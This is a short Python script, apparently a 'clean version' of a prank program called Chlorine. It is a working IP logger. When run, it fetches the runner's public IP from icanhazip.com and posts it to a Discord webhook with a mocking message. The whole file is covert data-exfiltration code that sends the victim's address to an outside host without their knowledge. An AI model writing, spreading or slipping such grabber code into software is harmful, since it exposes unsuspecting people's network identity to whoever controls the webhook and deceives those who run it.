# see main.py for comments on the code
import requests 

url = 'DISCORD WEBHOOK URL HERE'


ip = requests.get('https://icanhazip.com/')

webpage_text = ip.text



data = { 
    "username": "Ip logger!", 
    "content": "Heads up! Someone ran the clean version of Chlorine!! :rofl: lmao. Heres there ip:", # Notice how this one says the clean version was executed
    "embeds": [{
    "title": "ip is here",
    "description": ip.text
    }]
}

x = requests.post(url, json=data)
